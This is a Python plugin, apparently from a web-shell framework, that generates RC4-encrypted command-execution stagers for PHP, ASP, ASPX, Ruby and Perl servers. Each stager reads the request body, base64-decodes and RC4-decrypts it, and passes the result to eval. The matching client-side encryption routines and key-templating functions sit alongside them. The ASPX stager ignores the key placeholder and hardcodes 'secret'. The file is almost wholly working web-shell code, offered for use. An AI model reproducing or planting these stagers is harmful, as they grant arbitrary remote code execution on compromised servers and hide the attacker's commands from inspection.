# obfuscators/RC4.py

import base64
import textwrap
import json

PARAM_SCHEM = {
    "key" : "secret",
    "encoding" : "utf-8"
}

HELP = 'Obfuscate the payload with RC4.'

dicObfuscator = {
    'PHP' : textwrap.dedent('''
        function Encrypt($data) {
        // Key Scheduling Algorithm (KSA)
        $key = '[RC4_KEY]';
        $S = range(0, 255);
        $j = 0;
        $keyLength = strlen($key);

        for ($i = 0; $i < 256; $i++) {
            $j = ($j + $S[$i] + ord($key[$i % $keyLength])) % 256;
            $tmp = $S[$i];
            $S[$i] = $S[$j];
            $S[$j] = $tmp;
        }

        // Pseudo-Random Generation Algorithm (PRGA)
        $i = 0;
        $j = 0;
        $out = '';

        $dataLength = strlen($data);

        for ($k = 0; $k < $dataLength; $k++) {
            $i = ($i + 1) % 256;
            $j = ($j + $S[$i]) % 256;

            $tmp = $S[$i];
            $S[$i] = $S[$j];
            $S[$j] = $tmp;

            $t = ($S[$i] + $S[$j]) % 256;
            $out .= chr(ord($data[$k]) ^ $S[$t]);
        }

        return base64_encode($out);
    }                
    ''').strip(),
    
    'ASP' : textwrap.dedent('''
        Function Encrypt(data)
            Dim key, S(255), i, j, tmp, k, t, outStr, keyLength, dataLength
            key = "[RC4_KEY]"
            keyLength = Len(key)
            dataLength = Len(data)
            
            For i = 0 To 255
                S(i) = i
            Next
            
            j = 0
            For i = 0 To 255
                j = (j + S(i) + Asc(Mid(key, (i Mod keyLength) + 1, 1))) Mod 256
                tmp = S(i) : S(i) = S(j) : S(j) = tmp
            Next
            
            i = 0 : j = 0 : outStr = ""
            
            For k = 1 To dataLength
                i = (i + 1) Mod 256
                j = (j + S(i)) Mod 256
                tmp = S(i) : S(i) = S(j) : S(j) = tmp
                t = (S(i) + S(j)) Mod 256
                
                outStr = outStr & ChrW((AscW(Mid(data, k, 1)) And &HFF) Xor S(t))
            Next
            
            Dim xml, node
            Set xml = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xml.createElement("b64")
            node.DataType = "bin.base64"
            
            Dim stream
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 2 ' adTypeText
            stream.Charset = "iso-8859-1"
            stream.Open
            stream.WriteText outStr
            stream.Position = 0
            stream.Type = 1 ' adTypeBinary
            
            node.NodeTypedValue = stream.Read
            Encrypt = Replace(Replace(node.Text, vbLf, ""), vbCr, "")
            
            stream.Close
            Set stream = Nothing : Set node = Nothing : Set xml = Nothing
        End Function
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        function Encrypt(data : String) : String {
            var key : String = "[RC4_KEY]";
            var S = new int[256];
            var i : int, j : int = 0, tmp : int;
            var keyBytes = System.Text.Encoding.UTF8.GetBytes(key);
            var keyLength : int = keyBytes.Length;
            
            for (i = 0; i < 256; i++) {
                S[i] = i;
            }
            
            for (i = 0; i < 256; i++) {
                j = (j + S[i] + keyBytes[i % keyLength]) % 256;
                tmp = S[i]; S[i] = S[j]; S[j] = tmp;
            }
            
            i = 0; j = 0;
            var dataBytes = System.Text.Encoding.UTF8.GetBytes(data);
            var dataLength : int = dataBytes.Length;
            var outBytes : System.Byte[] = new System.Byte[dataLength];
            
            for (var k : int = 0; k < dataLength; k++) {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;
                
                tmp = S[i]; S[i] = S[j]; S[j] = tmp;
                var t : int = (S[i] + S[j]) % 256;
                outBytes[k] = System.Convert.ToByte(dataBytes[k] ^ S[t]);
            }
            
            return System.Convert.ToBase64String(outBytes);
        }
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        def Encrypt(data)
          require 'base64'
          key = "[RC4_KEY]"
          s = (0..255).to_a
          j = 0
          key_len = key.bytesize
          
          256.times do |i|
            j = (j + s[i] + key.byteslice(i % key_len).ord) % 256
            s[i], s[j] = s[j], s[i]
          end
          
          i = 0
          j = 0
          out = []
          
          data.each_byte do |byte|
            i = (i + 1) % 256
            j = (j + s[i]) % 256
            s[i], s[j] = s[j], s[i]
            
            t = (s[i] + s[j]) % 256
            out << (byte ^ s[t]).chr
          end
          
          Base64.strict_encode64(out.join)
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        sub Encrypt {
            use MIME::Base64;
            my ($data) = @_;
            my $key = '[RC4_KEY]';
            my @S = (0..255);
            my $j = 0;
            my $key_len = length($key);
            
            for my $i (0..255) {
                $j = ($j + $S[$i] + ord(substr($key, $i % $key_len, 1))) % 256;
                @S[$i, $j] = @S[$j, $i];
            }
            
            my $i = 0;
            $j = 0;
            my $out = '';
            my $data_len = length($data);
            
            for my $k (0..$data_len-1) {
                $i = ($i + 1) % 256;
                $j = ($j + $S[$i]) % 256;
                @S[$i, $j] = @S[$j, $i];
                
                my $t = ($S[$i] + $S[$j]) % 256;
                $out .= chr(ord(substr($data, $k, 1)) ^ $S[$t]);
            }
            
            return encode_base64($out, "");
        }
        ''').strip()
}

dicPayload = {
    'PHP' : textwrap.dedent('''
        <?php

        function rc4_crypt($data, $key) {
            // Key Scheduling Algorithm (KSA)
            $S = range(0, 255);
            $j = 0;
            $keyLength = strlen($key);

            for ($i = 0; $i < 256; $i++) {
                $j = ($j + $S[$i] + ord($key[$i % $keyLength])) % 256;
                $tmp = $S[$i];
                $S[$i] = $S[$j];
                $S[$j] = $tmp;
            }

            // Pseudo-Random Generation Algorithm (PRGA)
            $i = 0;
            $j = 0;
            $out = '';

            $dataLength = strlen($data);

            for ($k = 0; $k < $dataLength; $k++) {
                $i = ($i + 1) % 256;
                $j = ($j + $S[$i]) % 256;

                $tmp = $S[$i];
                $S[$i] = $S[$j];
                $S[$j] = $tmp;

                $t = ($S[$i] + $S[$j]) % 256;
                $out .= chr(ord($data[$k]) ^ $S[$t]);
            }

            return $out;
        }

        $KEY = "[RC4_KEY]";
        $rawInput = file_get_contents("php://input");
        $encryptedBytes = base64_decode($rawInput);
        $decrypted = rc4_crypt($encryptedBytes, $KEY);
        eval($decrypted);
                            
        ?>
        ''').strip(),

    'ASP' : textwrap.dedent('''
        <%
        On Error Resume Next

        Function DoRC4(bytesData, key)
            Dim S(255), i, j, k, t, tmp, keyLen, dataLen, outStr
            keyLen = Len(key)
            
            For i = 0 To 255 : S(i) = i : Next
            j = 0
            For i = 0 To 255
                j = (j + S(i) + Asc(Mid(key, (i Mod keyLen) + 1, 1))) Mod 256
                tmp = S(i) : S(i) = S(j) : S(j) = tmp
            Next

            dataLen = LenB(bytesData)

            If dataLen = 0 Then
                DoRC4 = "ERROR: SafeArray has NO bytes!"
                Exit Function
            End If

            i = 0 : j = 0 : outStr = ""
            
            For k = 1 To dataLen
                Dim cByte
                cByte = AscB(MidB(bytesData, k, 1))

                i = (i + 1) Mod 256
                j = (j + S(i)) Mod 256
                tmp = S(i) : S(i) = S(j) : S(j) = tmp
                t = (S(i) + S(j)) Mod 256
                
                outStr = outStr & ChrW(cByte Xor S(t))
            Next
            
            DoRC4 = outStr
        End Function

        Function SafeBinToString(binData)
            Dim str, length, i
            str = "": length = LenB(binData)
            For i = 1 To length
                str = str & Chr(AscB(MidB(binData, i, 1)))
            Next
            SafeBinToString = str
        End Function

        Dim byteCount, rawBytes, rawString
        byteCount = Request.TotalBytes

        If byteCount > 0 Then
            rawBytes = Request.BinaryRead(byteCount)
            rawString = SafeBinToString(rawBytes)

            rawString = Trim(rawString)
            rawString = Replace(rawString, vbCr, "")
            rawString = Replace(rawString, vbLf, "")

            Dim remainLen
            remainLen = Len(rawString) Mod 4
            If remainLen = 2 Then 
                rawString = rawString & "=="
            ElseIf remainLen = 3 Then 
                rawString = rawString & "="
            End If

            Dim xmlDoc, node
            Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xmlDoc.CreateElement("base64")
            node.dataType = "bin.base64"
            node.text = rawString

            Dim plaintext
            plaintext = DoRC4(node.nodeTypedValue, "[RC4_KEY]")
            
            If plaintext <> "" And InStr(plaintext, "ERROR") = 0 Then
                Eval(plaintext)
            End If
        End If
        %>
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        <%@ Page Language="JScript" %>
        <%
        try {
            var inputStream = Request.InputStream;
            var len = inputStream.Length;
            var rawBytes : System.Byte[] = new System.Byte[len];
            inputStream.Read(rawBytes, 0, len);
            var rawPost : String = System.Text.Encoding.ASCII.GetString(rawBytes).Trim();

            if (rawPost.indexOf("data=") == 0) {
                rawPost = rawPost.substring(5);
            }

            var decodedPost : String = System.Web.HttpUtility.UrlDecode(rawPost);
            var b64String : String = decodedPost.Replace(" ", "+");

            if (b64String != "") {
                var encryptedData : System.Byte[] = System.Convert.FromBase64String(b64String);
                var dataLength : int = encryptedData.Length;
                var list = new System.Collections.ArrayList();
                
                var S : int[] = new int[256];
                var i : int = 0, j : int = 0, t : int = 0;
                var keyBytes : System.Byte[] = System.Text.Encoding.UTF8.GetBytes("secret");
                for (i = 0; i < 256; i++) S[i] = i;
                for (i = 0; i < 256; i++) {
                    j = (j + S[i] + int(keyBytes[i % keyBytes.Length])) % 256;
                    var tmp : int = S[i]; S[i] = S[j]; S[j] = tmp;
                }

                i = 0; j = 0;
                for (var k : int = 0; k < dataLength; k++) {
                    i = (i + 1) % 256;
                    j = (j + S[i]) % 256;
                    var tmp2 : int = S[i]; S[i] = S[j]; S[j] = tmp2;
                    t = (S[i] + S[j]) % 256;

                    var cipherByte : int = int(encryptedData[k]);
                    var decryptedByte : int = cipherByte ^ S[t];
                    
                    list.Add(System.Convert.ToByte(decryptedByte));
                }

                var plaintextBytes : System.Byte[] = list.ToArray(System.Type.GetType("System.Byte"));
                var plaintext : String = System.Text.Encoding.UTF8.GetString(plaintextBytes);

                if (plaintext != "") {
                    eval(plaintext, "unsafe");
                }
            }
        } catch(e) {
            Response.Clear();
            var errMsg = "Unknown Error";
            if (e != null) {
                if (e.message != null) errMsg = e.message;
                else errMsg = e.ToString();
            }
            Response.Write("PAYLOAD_ERR: " + errMsg);
            Response.End();
        }
        %>
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        require 'base64'

        def rc4_crypt(data, key)
            s = (0..255).to_a

            j = 0
            key_bytes = key.bytes
            key_length = key_bytes.length

            # KSA
            (0...256).each do |i|
                j = (j + s[i] + key_bytes[i % key_length]) % 256

                tmp = s[i]
                s[i] = s[j]
                s[j] = tmp
            end

            # PRGA
            i = 0
            j = 0
            out = []

            data.bytes.each do |byte|
                i = (i + 1) % 256
                j = (j + s[i]) % 256

                tmp = s[i]
                s[i] = s[j]
                s[j] = tmp

                t = (s[i] + s[j]) % 256

                out << (byte ^ s[t])
            end

            out.pack("C*")
        end


        begin
            len = ENV['CONTENT_LENGTH'].to_i

            raw_input = STDIN.read(len)

            raw_input = raw_input.gsub(' ', '+')

            unless raw_input.empty?

                key = "[RC4_KEY]"

                encrypted_bytes = Base64.decode64(raw_input)

                decrypted = rc4_crypt(
                    encrypted_bytes,
                    key
                )

                eval(decrypted)

            end

        rescue => e
            print "Content-Type: text/plain\\r\\n\\r\\n"
            print e.message
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        use strict;
        use warnings;
        use MIME::Base64;

        sub rc4_crypt {
            my ($data, $key) = @_;

            my @s = (0..255);
            my $j = 0;

            my @key_bytes = map { ord } split(//, $key);
            my $key_length = scalar @key_bytes;

            # KSA
            for (my $i = 0; $i < 256; $i++) {
                $j = ($j + $s[$i] + $key_bytes[$i % $key_length]) % 256;
                @s[$i, $j] = @s[$j, $i];
            }

            # PRGA
            my $i = 0;
            $j = 0;

            my $out = "";

            for (my $k = 0; $k < length($data); $k++) {
                $i = ($i + 1) % 256;
                $j = ($j + $s[$i]) % 256;

                @s[$i, $j] = @s[$j, $i];

                my $t = ($s[$i] + $s[$j]) % 256;

                $out .= chr(
                    ord(substr($data, $k, 1)) ^ $s[$t]
                );
            }

            return $out;
        }


        my $len = $ENV{CONTENT_LENGTH} || 0;
        read(STDIN, my $rawInput, $len);

        $rawInput =~ tr/ /+/;

        if ($rawInput ne "") {

            my $key = "[RC4_KEY]";

            my $encryptedBytes = decode_base64($rawInput);

            my $decrypted = rc4_crypt(
                $encryptedBytes,
                $key
            );

            eval $decrypted;
        }
        ''').strip(),
}

def _rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # Pseudo-random generation algorithm (PRGA)
    out = bytearray()
    i = 0
    j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        out.append(byte ^ S[t])
        
    return bytes(out)

def help(payload, **kwargs):
    return HELP

def obfuscator(payload, script, key, **kwargs):
    if script in dicObfuscator.keys():
        return dicObfuscator[script].replace('[RC4_KEY]', key)
    else:
        return ''

def build(payload, script, key, **kwargs):
    if script in dicPayload.keys():
        return dicPayload[script].replace('[RC4_KEY]', key)
    else:
        return ''

def example(payload, **kwargs):
    return json.dumps(PARAM_SCHEM, indent=4)

def available(payload, **kwargs):
    scripts = []
    for script in dicPayload.keys():
        if not script in dicObfuscator.keys():
            continue

        scripts.append(script)

    return ','.join(scripts)

def obfuscate(payload, encoding='utf-8', key="default_key", **kwargs):
    
    data_bytes = payload.encode(encoding)
    key_bytes = key.encode(encoding)
    
    encrypted_bytes = _rc4_crypt(data_bytes, key_bytes)

    return base64.b64encode(encrypted_bytes).decode(encoding)

def deobfuscate(payload, encoding='utf-8', key="default_key", **kwargs):
    
    encrypted_bytes = base64.b64decode(payload.encode(encoding))
    key_bytes = key.encode(encoding)
    
    decrypted_bytes = _rc4_crypt(encrypted_bytes, key_bytes)

    return decrypted_bytes.decode(encoding)